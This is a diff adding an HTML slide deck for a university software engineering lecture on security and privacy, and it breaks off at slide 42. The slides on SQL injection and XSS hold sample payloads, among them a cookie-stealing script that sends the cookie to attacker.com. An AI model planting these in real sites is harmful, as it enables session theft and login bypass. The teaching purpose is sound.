@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security and Privacy - CSCI 5403</title>
+    
+    <!-- OCU Branded Presentation Styles with Theme Support -->
+    <link rel="stylesheet" href="../../styles/presentation.css">
+    <link rel="icon" type="image/x-icon" href="/images/favicon.png">
+    
+    <!-- Lecture-Specific Styles -->
+    <style>
+        .security-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        
+        .threat-box {
+            border: 2px solid #e74c3c;
+            background: rgba(231, 76, 60, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        
+        .defense-box {
+            border: 2px solid #27ae60;
+            background: rgba(39, 174, 96, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        
+        .attack-diagram {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin: 30px 0;
+        }
+        
+        .attack-step {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            flex: 1;
+            margin: 0 10px;
+        }
+        
+        .privacy-principle {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Theme toggle will be automatically added by JavaScript -->
+    
+    <div class="presentation-container">
+        <!-- Timer display for activities -->
+        <div class="timer-display" id="timer-display">
+            <span id="timer-text">Security and Privacy
+                 <button class="home"><a href="../index.html">Home</a></button>
+            </span>
+        </div>
+
+        <!-- Slide 1: Title -->
+        <div class="slide active">
+            <h1>Security and Privacy</h1>
+            <h2>Protecting Software and User Data <span class="emoji">🔐</span></h2>
+            <p style="font-size: 1.5em; margin-top: 40px;">CSCI 5403 - Software Engineering</p>
+            <p style="font-size: 1.3em;">Week 8 - Lecture 8</p>
+            <p style="margin-top: auto; font-style: italic;">"Security is not a product, but a process" - Bruce Schneier</p>
+        </div>
+
+        <!-- Slide 2: Learning Objectives -->
+        <div class="slide">
+            <h1>Today's Learning Objectives</h1>
+            <ul style="font-size: 1.4em; line-height: 2;">
+                <li>🎯 Understand common security threats and attacks</li>
+                <li>🎯 Learn authentication and authorization principles</li>
+                <li>🎯 Master encryption concepts and applications</li>
+                <li>🎯 Understand privacy regulations and compliance</li>
+                <li>🎯 Apply security best practices in software development</li>
+            </ul>
+        </div>
+
+        <!-- Slide 3: Security vs Privacy -->
+        <div class="slide">
+            <h1>Security vs Privacy</h1>
+            <div class="comparison-table">
+                <div class="comparison-card good">
+                    <h3>🔒 Security</h3>
+                    <p><strong>Technical concept</strong></p>
+                    <ul>
+                        <li>Protects system from attacks</li>
+                        <li>Maintains data integrity</li>
+                        <li>Ensures availability</li>
+                        <li>Prevents unauthorized access</li>
+                    </ul>
+                </div>
+                <div class="comparison-card bad">
+                    <h3>🔐 Privacy</h3>
+                    <p><strong>Social concept</strong></p>
+                    <ul>
+                        <li>Controls data collection</li>
+                        <li>Manages information use</li>
+                        <li>Respects user preferences</li>
+                        <li>Follows legal requirements</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: The CIA Triad -->
+        <div class="slide">
+            <h1>The CIA Triad of Security</h1>
+            <div class="attack-diagram">
+                <div class="attack-step">
+                    <h3>🔏 Confidentiality</h3>
+                    <p>Preventing unauthorized access to information</p>
+                    <p><em>Example: Data encryption</em></p>
+                </div>
+                <div class="attack-step">
+                    <h3>✅ Integrity</h3>
+                    <p>Ensuring data remains accurate and unmodified</p>
+                    <p><em>Example: Digital signatures</em></p>
+                </div>
+                <div class="attack-step">
+                    <h3>⚡ Availability</h3>
+                    <p>Ensuring authorized users can access resources</p>
+                    <p><em>Example: DDoS protection</em></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Types of Security Threats -->
+        <div class="slide">
+            <h1>Types of Security Threats</h1>
+            <div class="threat-box">
+                <h3>🚨 Availability Threats</h3>
+                <p>Deny access to legitimate users</p>
+                <p><strong>Examples:</strong> DDoS attacks, Ransomware</p>
+            </div>
+            <div class="threat-box">
+                <h3>🔨 Integrity Threats</h3>
+                <p>Damage the system or its data</p>
+                <p><strong>Examples:</strong> Viruses, Malware, Data corruption</p>
+            </div>
+            <div class="threat-box">
+                <h3>🕵️ Confidentiality Threats</h3>
+                <p>Gain access to private information</p>
+                <p><strong>Examples:</strong> Data theft, Unauthorized access</p>
+            </div>
+        </div>
+
+        <!-- Slide 6: Common Attack Types Overview -->
+        <div class="slide">
+            <h1>Common Attack Types</h1>
+            <ul style="font-size: 1.3em; line-height: 2;">
+                <li>💉 <strong>Injection Attacks</strong> - Malicious code insertion</li>
+                <li>📝 <strong>Cross-Site Scripting (XSS)</strong> - JavaScript injection</li>
+                <li>🍪 <strong>Session Hijacking</strong> - Stealing session cookies</li>
+                <li>🔨 <strong>Denial of Service (DoS)</strong> - Overwhelming the system</li>
+                <li>🔑 <strong>Brute Force Attacks</strong> - Password guessing</li>
+                <li>🎣 <strong>Phishing</strong> - Social engineering attacks</li>
+            </ul>
+        </div>
+
+        <!-- Slide 7: Injection Attacks -->
+        <div class="slide">
+            <h1>Injection Attacks</h1>
+            <p>Malicious users input code or commands through valid input fields</p>
+            
+            <div class="threat-box">
+                <h3>Common Types:</h3>
+                <ul>
+                    <li><strong>SQL Injection:</strong> Inserting SQL commands into form fields</li>
+                    <li><strong>Buffer Overflow:</strong> Exceeding memory boundaries</li>
+                    <li><strong>Command Injection:</strong> Executing system commands</li>
+                </ul>
+            </div>
+            
+            <div class="defense-box">
+                <h3>Defense:</h3>
+                <ul>
+                    <li>Input validation and sanitization</li>
+                    <li>Parameterized queries</li>
+                    <li>Least privilege principle</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 8: SQL Injection Example -->
+        <div class="slide">
+            <h1>SQL Injection Example</h1>
+            <div class="code-example">
+                <pre><code>// Vulnerable code
+String query = "SELECT * FROM users WHERE 
+    username = '" + userInput + "' AND 
+    password = '" + passInput + "'";
+
+// Attacker inputs: admin' OR '1'='1
+// Resulting query:
+SELECT * FROM users WHERE 
+    username = 'admin' OR '1'='1' AND 
+    password = ''</code></pre>
+            </div>
+            <div class="tip-box">
+                <strong>Result:</strong> Attacker bypasses authentication and gains admin access!
+            </div>
+        </div>
+
+        <!-- Slide 9: Cross-Site Scripting (XSS) -->
+        <div class="slide">
+            <h1>Cross-Site Scripting (XSS)</h1>
+            <p>Injecting malicious JavaScript into web pages viewed by other users</p>
+            
+            <div class="attack-diagram">
+                <div class="attack-step">
+                    <h4>1. Inject</h4>
+                    <p>Attacker adds malicious script to website</p>
+                </div>
+                <div class="attack-step">
+                    <h4>2. Store</h4>
+                    <p>Script saved in database or page</p>
+                </div>
+                <div class="attack-step">
+                    <h4>3. Execute</h4>
+                    <p>Script runs in victim's browser</p>
+                </div>
+                <div class="attack-step">
+                    <h4>4. Steal</h4>
+                    <p>Data sent to attacker</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: XSS Example -->
+        <div class="slide">
+            <h1>XSS Attack Example</h1>
+            <div class="code-example">
+                <pre><code>// Attacker posts this comment:
+&lt;script&gt;
+  // Steal session cookie
+  var cookie = document.cookie;
+  var img = new Image();
+  img.src = "http://attacker.com/steal?data=" + cookie;
+&lt;/script&gt;
+
+// When other users view the comment:
+// Their cookies are sent to the attacker!</code></pre>
+            </div>
+            <div class="defense-box">
+                <h3>Prevention:</h3>
+                <ul>
+                    <li>HTML entity encoding</li>
+                    <li>Content Security Policy (CSP)</li>
+                    <li>Input validation</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 11: Session Hijacking -->
+        <div class="slide">
+            <h1>Session Hijacking</h1>
+            <p>Stealing or predicting valid session tokens to gain unauthorized access</p>
+            
+            <div class="threat-box">
+                <h3>Attack Methods:</h3>
+                <ul>
+                    <li>🍪 Cookie theft via XSS</li>
+                    <li>📡 Network traffic sniffing</li>
+                    <li>🔍 Session ID prediction</li>
+                    <li>📧 Phishing attacks</li>
+                </ul>
+            </div>
+            
+            <div class="defense-box">
+                <h3>Protection:</h3>
+                <ul>
+                    <li>HTTPS everywhere</li>
+                    <li>Secure cookie flags</li>
+                    <li>Session timeout</li>
+                    <li>Token regeneration</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 12: Denial of Service Attacks -->
+        <div class="slide">
+            <h1>Denial of Service (DoS) Attacks</h1>
+            <p>Making a system unavailable to legitimate users</p>
+            
+            <div class="comparison-table">
+                <div class="comparison-card bad">
+                    <h3>🔴 DoS Attack</h3>
+                    <p>Single source attack</p>
+                    <ul>
+                        <li>Resource exhaustion</li>
+                        <li>Crash exploits</li>
+                        <li>Bandwidth flooding</li>
+                    </ul>
+                </div>
+                <div class="comparison-card bad">
+                    <h3>🔴🔴🔴 DDoS Attack</h3>
+                    <p>Distributed attack from botnets</p>
+                    <ul>
+                        <li>Thousands of sources</li>
+                        <li>Hard to block</li>
+                        <li>Massive traffic volumes</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 13: Brute Force Attacks -->
+        <div class="slide">
+            <h1>Brute Force Attacks</h1>
+            <p>Systematically trying all possible passwords</p>
+            
+            <div class="code-example">
+                <pre><code>// Common password patterns attackers try:
+1. password123
+2. 123456
+3. qwerty
+4. admin
+5. [username]123
+6. [CompanyName]2024
+7. Dictionary words
+8. Previous breach passwords</code></pre>
+            </div>
+            
+            <div class="defense-box">
+                <h3>Defenses:</h3>
+                <ul>
+                    <li>Strong password requirements</li>
+                    <li>Account lockout policies</li>
+                    <li>CAPTCHA challenges</li>
+                    <li>Rate limiting</li>
+                    <li>Multi-factor authentication</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 14: Activity - Identify the Attack -->
+        <div class="slide">
+            <h1>Practice Activity: Identify the Attack <span class="emoji">🕵️</span></h1>
+            <div class="activity-box">
+                <h3>5-Minute Challenge</h3>
+                <p>Match each scenario to the attack type:</p>
+                <ol>
+                    <li>User receives email asking to verify bank account</li>
+                    <li>Website becomes unresponsive after 10,000 requests/second</li>
+                    <li>Login form accepts: ' OR 1=1 --</li>
+                    <li>Comment section displays: &lt;script&gt;alert('hacked')&lt;/script&gt;</li>
+                    <li>Automated script tries 1000 passwords on admin account</li>
+                </ol>
+            </div>
+            <button data-timer="5">Start 5-Minute Timer</button>
+        </div>
+
+        <!-- Slide 15: Authentication Overview -->
+        <div class="slide">
+            <h1>Authentication: Who Are You?</h1>
+            <p style="font-size: 1.3em;">Verifying the identity of users, systems, or entities</p>
+            
+            <div class="security-card">
+                <h3>Authentication Factors:</h3>
+                <ul style="font-size: 1.2em;">
+                    <li>🧠 <strong>Something you KNOW</strong> - Password, PIN</li>
+                    <li>🔑 <strong>Something you HAVE</strong> - Token, phone, card</li>
+                    <li>👤 <strong>Something you ARE</strong> - Fingerprint, face, iris</li>
+                </ul>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Multi-Factor Authentication (MFA):</strong> Combines two or more factors for stronger security
+            </div>
+        </div>
+
+        <!-- Slide 16: Password Authentication -->
+        <div class="slide">
+            <h1>Password Authentication Challenges</h1>
+            
+            <div class="threat-box">
+                <h3>Common Problems:</h3>
+                <ul>
+                    <li>📝 Users choose weak passwords</li>
+                    <li>🔄 Password reuse across sites</li>
+                    <li>🎣 Phishing attacks</li>
+                    <li>🤔 Forgotten passwords</li>
+                    <li>📋 Written down passwords</li>
+                </ul>
+            </div>
+            
+            <div class="defense-box">
+                <h3>Best Practices:</h3>
+                <ul>
+                    <li>Minimum length requirements (12+ characters)</li>
+                    <li>Password complexity rules</li>
+                    <li>Password managers</li>
+                    <li>Regular password changes</li>
+                    <li>Breach monitoring</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 17: Biometric Authentication -->
+        <div class="slide">
+            <h1>Biometric Authentication</h1>
+            <div class="comparison-table">
+                <div class="comparison-card good">
+                    <h3>✅ Advantages</h3>
+                    <ul>
+                        <li>Can't be forgotten</li>
+                        <li>Difficult to forge</li>
+                        <li>Unique to individual</li>
+                        <li>Convenient</li>
+                    </ul>
+                </div>
+                <div class="comparison-card bad">
+                    <h3>❌ Disadvantages</h3>
+                    <ul>
+                        <li>Can't be changed if compromised</li>
+                        <li>Privacy concerns</li>
+                        <li>False positives/negatives</li>
+                        <li>Expensive hardware</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 18: Federated Authentication -->
+        <div class="slide">
+            <h1>Federated Authentication</h1>
+            <p>Delegating authentication to trusted third-party providers</p>
+            
+            <div class="security-card">
+                <h3>Common Providers:</h3>
+                <ul>
+                    <li>🔵 Google Sign-In</li>
+                    <li>📘 Facebook Login</li>
+                    <li>🔶 Microsoft Account</li>
+                    <li>🍎 Sign in with Apple</li>
+                    <li>🐙 GitHub OAuth</li>
+                </ul>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Benefits:</strong> No password management, reduced development effort, trusted security<br>
+                <strong>Risks:</strong> Single point of failure, privacy concerns, vendor lock-in
+            </div>
+        </div>
+
+        <!-- Slide 19: Authorization -->
+        <div class="slide">
+            <h1>Authorization: What Can You Do?</h1>
+            <p>Controlling access to resources based on authenticated identity</p>
+            
+            <div class="code-example">
+                <pre><code>// Role-Based Access Control (RBAC)
+if (user.role === 'admin') {
+    // Full access
+    allowAllOperations();
+} else if (user.role === 'editor') {
+    // Read and write access
+    allowReadWrite();
+} else if (user.role === 'viewer') {
+    // Read-only access
+    allowReadOnly();
+} else {
+    // No access
+    denyAccess();
+}</code></pre>
+            </div>
+        </div>
+
+        <!-- Slide 20: Access Control Lists -->
+        <div class="slide">
+            <h1>Access Control Lists (ACLs)</h1>
+            <p>Defining permissions for specific users or groups</p>
+            
+            <div class="demo-box">
+                <h3>Example File ACL:</h3>
+                <table style="width: 100%; margin-top: 20px;">
+                    <tr>
+                        <th>User/Group</th>
+                        <th>Read</th>
+                        <th>Write</th>
+                        <th>Execute</th>
+                    </tr>
+                    <tr>
+                        <td>Owner</td>
+                        <td>✅</td>
+                        <td>✅</td>
+                        <td>✅</td>
+                    </tr>
+                    <tr>
+                        <td>Admin Group</td>
+                        <td>✅</td>
+                        <td>✅</td>
+                        <td>❌</td>
+                    </tr>
+                    <tr>
+                        <td>Users Group</td>
+                        <td>✅</td>
+                        <td>❌</td>
+                        <td>❌</td>
+                    </tr>
+                    <tr>
+                        <td>Others</td>
+                        <td>❌</td>
+                        <td>❌</td>
+                        <td>❌</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- Slide 21: Principle of Least Privilege -->
+        <div class="slide">
+            <h1>Principle of Least Privilege</h1>
+            <p style="font-size: 1.3em;">Users should have the minimum access necessary to perform their tasks</p>
+            
+            <div class="comparison-table">
+                <div class="comparison-card bad">
+                    <h3>❌ Bad Practice</h3>
+                    <ul>
+                        <li>Everyone has admin access</li>
+                        <li>Shared passwords</li>
+                        <li>Never revoke permissions</li>
+                        <li>One-size-fits-all approach</li>
+                    </ul>
+                </div>
+                <div class="comparison-card good">
+                    <h3>✅ Good Practice</h3>
+                    <ul>
+                        <li>Role-based permissions</li>
+                        <li>Individual accounts</li>
+                        <li>Regular access reviews</li>
+                        <li>Just-in-time access</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 22: Encryption Fundamentals -->
+        <div class="slide">
+            <h1>Encryption: Protecting Data</h1>
+            <p>Converting readable data (plaintext) into unreadable format (ciphertext)</p>
+            
+            <div class="attack-diagram">
+                <div class="attack-step">
+                    <h4>📄 Plaintext</h4>
+                    <p>"Hello World"</p>
+                </div>
+                <div class="attack-step">
+                    <h4>🔐 Encrypt</h4>
+                    <p>+ Secret Key</p>
+                </div>
+                <div class="attack-step">
+                    <h4>🔒 Ciphertext</h4>
+                    <p>"X#9$kL@2%"</p>
+                </div>
+                <div class="attack-step">
+                    <h4>🔓 Decrypt</h4>
+                    <p>+ Secret Key</p>
+                </div>
+                <div class="attack-step">
+                    <h4>📄 Plaintext</h4>
+                    <p>"Hello World"</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 23: Symmetric Encryption -->
+        <div class="slide">
+            <h1>Symmetric Encryption</h1>
+            <p>Same key used for both encryption and decryption</p>
+            
+            <div class="security-card">
+                <h3>Characteristics:</h3>
+                <ul>
+                    <li>🔑 Single shared secret key</li>
+                    <li>⚡ Fast performance</li>
+                    <li>📊 Good for large data</li>
+                    <li>🤝 Key exchange challenge</li>
+                </ul>
+                
+                <h3>Common Algorithms:</h3>
+                <ul>
+                    <li>AES (Advanced Encryption Standard)</li>
+                    <li>DES/3DES (deprecated)</li>
+                    <li>Blowfish</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 24: Asymmetric Encryption -->
+        <div class="slide">
+            <h1>Asymmetric Encryption</h1>
+            <p>Different keys for encryption and decryption (public/private key pair)</p>
+            
+            <div class="attack-diagram">
+                <div class="attack-step">
+                    <h4>🔓 Public Key</h4>
+                    <p>Shared openly</p>
+                    <p>Used to encrypt</p>
+                </div>
+                <div class="attack-step">
+                    <h4>↔️</h4>
+                </div>
+                <div class="attack-step">
+                    <h4>🔐 Private Key</h4>
+                    <p>Kept secret</p>
+                    <p>Used to decrypt</p>
+                </div>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Common Algorithms:</strong> RSA, ECC, DSA<br>
+                <strong>Use Cases:</strong> Digital signatures, key exchange, certificates
+            </div>
+        </div>
+
+        <!-- Slide 25: HTTPS and TLS -->
+        <div class="slide">
+            <h1>HTTPS: Secure Web Communications</h1>
+            <p>HTTP + TLS/SSL = Encrypted web traffic</p>
+            
+            <div class="demo-box">
+                <h3>TLS Handshake Process:</h3>
+                <ol>
+                    <li>🤝 Client hello - supported cipher suites</li>
+                    <li>📜 Server certificate - public key</li>
+                    <li>✅ Certificate verification</li>
+                    <li>🔑 Key exchange - generate session key</li>
+                    <li>🔒 Encrypted communication begins</li>
+                </ol>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Benefits:</strong> Confidentiality, integrity, authentication
+            </div>
+        </div>
+
+        <!-- Slide 26: Data Encryption States -->
+        <div class="slide">
+            <h1>When to Encrypt Data</h1>
+            
+            <div class="security-card">
+                <h3>📡 Data in Transit</h3>
+                <ul>
+                    <li>HTTPS for web traffic</li>
+                    <li>VPN for network connections</li>
+                    <li>SSH for remote access</li>
+                    <li>TLS for email</li>
+                </ul>
+            </div>
+            
+            <div class="security-card">
+                <h3>💾 Data at Rest</h3>
+                <ul>
+                    <li>Database encryption</li>
+                    <li>File system encryption</li>
+                    <li>Backup encryption</li>
+                    <li>Cloud storage encryption</li>
+                </ul>
+            </div>
+            
+            <div class="security-card">
+                <h3>⚙️ Data in Use</h3>
+                <p>Usually unencrypted for processing (performance reasons)</p>
+                <p>Emerging: Homomorphic encryption, secure enclaves</p>
+            </div>
+        </div>
+
+        <!-- Slide 27: Key Management -->
+        <div class="slide">
+            <h1>Key Management Systems (KMS)</h1>
+            <p>Securely storing and managing encryption keys</p>
+            
+            <div class="threat-box">
+                <h3>Challenges:</h3>
+                <ul>
+                    <li>🔑 Thousands of keys to manage</li>
+                    <li>🔄 Key rotation requirements</li>
+                    <li>📦 Archival data with old keys</li>
+                    <li>🌍 Regulatory compliance (6+ year retention)</li>
+                </ul>
+            </div>
+            
+            <div class="defense-box">
+                <h3>KMS Features:</h3>
+                <ul>
+                    <li>Centralized key storage</li>
+                    <li>Automatic key rotation</li>
+                    <li>Access logging</li>
+                    <li>Hardware Security Modules (HSM)</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 28: Privacy Introduction -->
+        <div class="slide">
+            <h1>Privacy: A Social Concept</h1>
+            <p style="font-size: 1.3em;">How people feel about collection and use of their personal information</p>
+            
+            <div class="privacy-principle">
+                <h3>Privacy varies by:</h3>
+                <ul>
+                    <li>🌍 Culture and country</li>
+                    <li>👥 Age and generation</li>
+                    <li>🕐 Time period</li>
+                    <li>👤 Individual preferences</li>
+                </ul>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Remember:</strong> What's acceptable in one context may be a violation in another
+            </div>
+        </div>
+
+        <!-- Slide 29: Personal Data Types -->
+        <div class="slide">
+            <h1>Types of Personal Data</h1>
+            
+            <div class="comparison-table">
+                <div class="comparison-card good">
+                    <h3>📋 Personal Data</h3>
+                    <ul>
+                        <li>Name, address</li>
+                        <li>Email, phone</li>
+                        <li>IP address</li>
+                        <li>Cookies</li>
+                        <li>Location data</li>
+                    </ul>
+                </div>
+                <div class="comparison-card bad">
+                    <h3>🔴 Sensitive Personal Data</h3>
+                    <ul>
+                        <li>Health records</li>
+                        <li>Financial information</li>
+                        <li>Religious beliefs</li>
+                        <li>Sexual orientation</li>
+                        <li>Biometric data</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <p style="margin-top: 20px; font-style: italic;">Sensitive data requires stronger protection and explicit consent</p>
+        </div>
+
+        <!-- Slide 30: Data Protection Regulations -->
+        <div class="slide">
+            <h1>Data Protection Laws</h1>
+            
+            <div class="demo-box">
+                <h3>Major Regulations:</h3>
+                <ul>
+                    <li>🇪🇺 <strong>GDPR</strong> - General Data Protection Regulation (EU)</li>
+                    <li>🇺🇸 <strong>CCPA</strong> - California Consumer Privacy Act</li>
+                    <li>🇬🇧 <strong>UK GDPR</strong> - UK Data Protection Act</li>
+                    <li>🇧🇷 <strong>LGPD</strong> - Lei Geral de Proteção de Dados (Brazil)</li>
+                    <li>🇨🇦 <strong>PIPEDA</strong> - Personal Information Protection (Canada)</li>
+                </ul>
+            </div>
+            
+            <div class="threat-box">
+                <h3>Non-compliance penalties:</h3>
+                <p>GDPR: Up to 4% of annual global turnover or €20 million</p>
+            </div>
+        </div>
+
+        <!-- Slide 31: GDPR Rights -->
+        <div class="slide">
+            <h1>GDPR User Rights</h1>
+            
+            <div class="privacy-principle">
+                <h3>Data Subject Rights:</h3>
+                <ul style="font-size: 1.2em;">
+                    <li>📥 <strong>Right to Access</strong> - Get copy of personal data</li>
+                    <li>✏️ <strong>Right to Rectification</strong> - Correct inaccurate data</li>
+                    <li>🗑️ <strong>Right to Erasure</strong> - "Right to be forgotten"</li>
+                    <li>📦 <strong>Right to Portability</strong> - Transfer data</li>
+                    <li>🛑 <strong>Right to Object</strong> - Stop processing</li>
+                    <li>🤖 <strong>Right to Explanation</strong> - Understand automated decisions</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 32: Data Controller Responsibilities -->
+        <div class="slide">
+            <h1>Data Controller Obligations</h1>
+            
+            <div class="defense-box">
+                <h3>Key Requirements:</h3>
+                <ul>
+                    <li>🔒 <strong>Security:</strong> Implement appropriate technical measures</li>
+                    <li>📝 <strong>Consent:</strong> Obtain clear, informed consent</li>
+                    <li>🎯 <strong>Purpose Limitation:</strong> Use data only for stated purposes</li>
+                    <li>⏱️ <strong>Storage Limitation:</strong> Keep data only as long as needed</li>
+                    <li>📊 <strong>Data Minimization:</strong> Collect only necessary data</li>
+                    <li>🚨 <strong>Breach Notification:</strong> Report within 72 hours</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 33: Privacy Policy -->
+        <div class="slide">
+            <h1>Creating a Privacy Policy</h1>
+            
+            <div class="demo-box">
+                <h3>Essential Elements:</h3>
+                <ol>
+                    <li>What data you collect</li>
+                    <li>How you collect it</li>
+                    <li>Why you collect it (legal basis)</li>
+                    <li>How you use it</li>
+                    <li>Who you share it with</li>
+                    <li>How long you keep it</li>
+                    <li>User rights and how to exercise them</li>
+                    <li>Contact information</li>
+                </ol>
+            </div>
+            
+            <div class="tip-box">
+                <strong>GDPR Requirement:</strong> Must be in clear, plain language - not legal jargon!
+            </div>
+        </div>
+
+        <!-- Slide 34: Privacy by Design -->
+        <div class="slide">
+            <h1>Privacy by Design Principles</h1>
+            
+            <div class="privacy-principle">
+                <ol style="font-size: 1.2em; line-height: 1.8;">
+                    <li>🛡️ <strong>Proactive not Reactive</strong></li>
+                    <li>🔐 <strong>Privacy as Default</strong></li>
+                    <li>🏗️ <strong>Full Functionality</strong></li>
+                    <li>🔒 <strong>End-to-End Security</strong></li>
+                    <li>👁️ <strong>Visibility and Transparency</strong></li>
+                    <li>👤 <strong>Respect for User Privacy</strong></li>
+                    <li>📋 <strong>Privacy Embedded into Design</strong></li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Slide 35: Activity - Privacy Audit -->
+        <div class="slide">
+            <h1>Practice Activity: Privacy Audit <span class="emoji">🔍</span></h1>
+            <div class="activity-box">
+                <h3>10-Minute Challenge</h3>
+                <p>Review a website/app and identify:</p>
+                <ol>
+                    <li>What personal data is collected?</li>
+                    <li>Is there a privacy policy link?</li>
+                    <li>Are cookies explained?</li>
+                    <li>Is consent obtained properly?</li>
+                    <li>Can users delete their data?</li>
+                </ol>
+                <p><strong>Website suggestions:</strong> Your favorite social media, shopping site, or news site</p>
+            </div>
+            <button data-timer="10">Start 10-Minute Timer</button>
+        </div>
+
+        <!-- Slide 36: Security Management -->
+        <div class="slide">
+            <h1>Security Management Practices</h1>
+            
+            <div class="security-card">
+                <h3>Essential Components:</h3>
+                <ul>
+                    <li>🔐 <strong>Authentication Standards</strong> - Strong password policies</li>
+                    <li>🛡️ <strong>Infrastructure Management</strong> - Keep systems updated</li>
+                    <li>👁️ <strong>Attack Monitoring</strong> - Detect intrusions early</li>
+                    <li>💾 <strong>Backup Policies</strong> - Regular, encrypted backups</li>
+                    <li>📋 <strong>Incident Response</strong> - Plan for breaches</li>
+                    <li>🎓 <strong>Security Training</strong> - Educate all users</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 37: Security Testing -->
+        <div class="slide">
+            <h1>Security Testing Approaches</h1>
+            
+            <div class="comparison-table">
+                <div class="comparison-card good">
+                    <h3>🔍 Static Testing</h3>
+                    <ul>
+                        <li>Code review</li>
+                        <li>SAST tools</li>
+                        <li>Dependency scanning</li>
+                        <li>Configuration review</li>
+                    </ul>
+                </div>
+                <div class="comparison-card good">
+                    <h3>⚡ Dynamic Testing</h3>
+                    <ul>
+                        <li>Penetration testing</li>
+                        <li>DAST tools</li>
+                        <li>Fuzzing</li>
+                        <li>Vulnerability scanning</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 38: OWASP Top 10 -->
+        <div class="slide">
+            <h1>OWASP Top 10 Security Risks</h1>
+            <ol style="font-size: 1.2em; line-height: 1.8;">
+                <li>💉 Broken Access Control</li>
+                <li>🔐 Cryptographic Failures</li>
+                <li>💊 Injection</li>
+                <li>🏗️ Insecure Design</li>
+                <li>⚙️ Security Misconfiguration</li>
+                <li>📦 Vulnerable Components</li>
+                <li>🔑 Authentication Failures</li>
+                <li>📊 Software and Data Integrity Failures</li>
+                <li>📝 Security Logging Failures</li>
+                <li>🎭 Server-Side Request Forgery</li>
+            </ol>
+            <div class="tip-box">
+                <strong>Resource:</strong> Visit owasp.org for detailed guidance
+            </div>
+        </div>
+
+        <!-- Slide 39: Security Best Practices -->
+        <div class="slide">
+            <h1>Security Development Best Practices</h1>
+            
+            <div class="defense-box">
+                <h3>Secure Coding Guidelines:</h3>
+                <ul>
+                    <li>✅ Always validate and sanitize input</li>
+                    <li>✅ Use parameterized queries</li>
+                    <li>✅ Implement proper error handling</li>
+                    <li>✅ Never hardcode secrets</li>
+                    <li>✅ Use secure libraries and frameworks</li>
+                    <li>✅ Implement logging and monitoring</li>
+                    <li>✅ Regular security updates</li>
+                    <li>✅ Code reviews and testing</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 40: Business Impact -->
+        <div class="slide">
+            <h1>Why Security and Privacy Matter</h1>
+            
+            <div class="threat-box">
+                <h3>🚨 Consequences of Breaches:</h3>
+                <ul>
+                    <li>💰 Financial losses (average $4.45M per breach)</li>
+                    <li>⚖️ Legal penalties and lawsuits</li>
+                    <li>😔 Reputation damage</li>
+                    <li>🚪 Customer loss</li>
+                    <li>📉 Stock price impact</li>
+                    <li>🔒 Regulatory restrictions</li>
+                </ul>
+            </div>
+            
+            <div class="defense-box">
+                <h3>✅ Benefits of Good Security:</h3>
+                <ul>
+                    <li>Customer trust</li>
+                    <li>Competitive advantage</li>
+                    <li>Regulatory compliance</li>
+                    <li>Business continuity</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 41: Real-World Examples -->
+        <div class="slide">
+            <h1>Notable Security Breaches</h1>
+            
+            <div class="demo-box">
+                <h3>Learn from History:</h3>
+                <ul style="font-size: 1.2em; line-height: 1.8;">
+                    <li>🎯 <strong>Target (2013)</strong> - 40M credit cards stolen via HVAC vendor</li>
+                    <li>💳 <strong>Equifax (2017)</strong> - 147M records, unpatched vulnerability</li>
+                    <li>💬 <strong>Facebook (2019)</strong> - 540M records exposed on AWS</li>
+                    <li>🏨 <strong>Marriott (2018)</strong> - 500M guest records over 4 years</li>
+                    <li>📧 <strong>Yahoo (2013-14)</strong> - 3B accounts compromised</li>
+                </ul>
+            </div>
+            
+            <div class="tip-box">
+                <strong>Common factors:</strong> Unpatched systems, weak passwords, insider threats, third-party vulnerabilities
+            </div>
+        </div>
+
+        <!-- Slide 42: Emerging Threats -->
+        <div class="slide">
+            <h1>Emerging Security Challenges</h1>
+            
+            <div class="security-card">
+                <h3>Future Concerns:</h3>
+                <ul style="font-size: 1.2em;">
+                    <li>🤖 <strong>AI-Powered Attacks</strong> - Sophisticated phishing, deepfakes</li>
+                    <li>🏠 <strong>IoT Vulnerabilities</strong> - Billions of connected devices</li>
